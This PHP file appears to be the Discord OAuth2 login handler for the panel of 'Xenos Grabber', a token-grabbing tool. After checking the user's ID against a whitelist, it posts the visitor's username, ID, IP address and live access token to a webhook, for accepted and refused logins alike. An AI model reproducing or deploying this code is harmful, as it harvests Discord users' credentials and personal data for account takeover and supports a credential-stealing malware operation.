<?php
    require_once('../Inc/fonctions.php');
    global $webhook, $OAUTH2_CLIENT_ID, $OAUTH2_CLIENT_SECRET, $RedirectUrl, $WhitelistIds;
    
    $authorizeURL = 'https://discord.com/api/oauth2/authorize';
    $tokenURL = 'https://discord.com/api/oauth2/token';
    $InfosRequest = 'https://discordapp.com/api/users/@me';

    if(!isset($_GET['code'])) {
    
        $params = array(
            'client_id' => $OAUTH2_CLIENT_ID,
            'redirect_uri' => $RedirectUrl,
            'response_type' => 'code',
            'scope' => 'identify guilds'
        );
    
        $_SESSION["logged"] = false;
        header('Location: https://discord.com/api/oauth2/authorize' . '?' . http_build_query($params)); die();
    } else if(isset($_GET['code']) && !empty($_GET["code"])) {
        $token = curl_init();
        curl_setopt_array($token, array(
            CURLOPT_URL => $tokenURL,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => array(
                "grant_type" => "authorization_code",
                "client_id" => $OAUTH2_CLIENT_ID,
                "client_secret" => $OAUTH2_CLIENT_SECRET,
                "redirect_uri" => $RedirectUrl,
                "code" => htmlspecialchars($_GET["code"]),
            )
        ));
        curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
        $resp = json_decode(curl_exec($token));
        curl_close($token);

        if (isset($resp->access_token)) {
            
            $info = curl_init();
            curl_setopt_array($info, array(
                CURLOPT_URL => $InfosRequest,
                CURLOPT_HTTPHEADER => array(
                    "Authorization: Bearer " . $resp->access_token
                ),
                CURLOPT_RETURNTRANSFER => true
            ));
            $user = json_decode(curl_exec($info));
            curl_close($info);
            
            if(in_array(strval($user->id), $WhitelistIds)) {
                $_SESSION['access_token'] = $resp->access_token;
                $_SESSION["login_username"] = "{$user->username}#{$user->discriminator}";
                $_SESSION["login_avatar"] = "https://cdn.discordapp.com/avatars/{$user->id}/{$user->avatar}";
                SendToWebhook($webhook, json_encode(
                    [
                        "username" => "Xenos Grabber",
                        "avatar_url" => "https://github.com/KanekiWeb/Xenos/blob/main/assets/images/xenos.gif?raw=true",
                        "embeds" => [
                            [
                                "description" => "> __Tentative de connexion à Xenos Réussi:__\n```diff\n+ Login Username: {$user->username}#{$user->discriminator}\n+ Login ID: {$user->id}\n+ Ip Adress: {$_SERVER['REMOTE_ADDR']}\n+ Access Token: {$resp->access_token}```\n\n",
                                "thumbnail" => [
                                    "url" => "https://cdn.discordapp.com/avatars/{$user->id}/{$user->avatar}"
                                ],
                                "image" => [
                                    "url" => "https://discordapp.com/api/v6/users/banners/{$user->id}/{$user->avatar}"
                                ],
                                "footer" => [
                                    "text" => "Xenos Grabber - https://github.com/KanekiWeb",
                                    "icon_url" => "https://github.com/KanekiWeb/Xenos/blob/main/assets/images/xenos.gif?raw=true"
                                ],
                                "color" =>  hexdec("279930")
                            ]
                        ]
                    ]
                ));
            } else {
                SendToWebhook($webhook, json_encode(
                    [
                        "username" => "Xenos Grabber",
                        "avatar_url" => "https://github.com/KanekiWeb/Xenos/blob/main/assets/images/xenos.gif?raw=true",
                        "embeds" => [
                            [
                                "description" => "> __Tentative de connexion à Xenos Refusé:__\n```diff\n- Login Username: {$user->username}#{$user->discriminator}\n- Login ID: {$user->id}\n- Ip Adress: {$_SERVER['REMOTE_ADDR']}\n- Access Token: {$resp->access_token}```\n\n",
                                "thumbnail" => [
                                    "url" => "https://cdn.discordapp.com/avatars/{$user->id}/{$user->avatar}"
                                ],
                                "image" => [
                                    "url" => "https://discordapp.com/api/v6/users/banners/{$user->id}/{$user->avatar}"
                                ],
                                "footer" => [
                                    "text" => "Xenos Grabber - https://github.com/KanekiWeb",
                                    "icon_url" => "https://github.com/KanekiWeb/Xenos/blob/main/assets/images/xenos.gif?raw=true"
                                ],
                                "color" => hexdec("992727")
                            ]
                        ]
                    ]
                ));
            }
        }
        
        header('Location: ../'); die();
    }

?>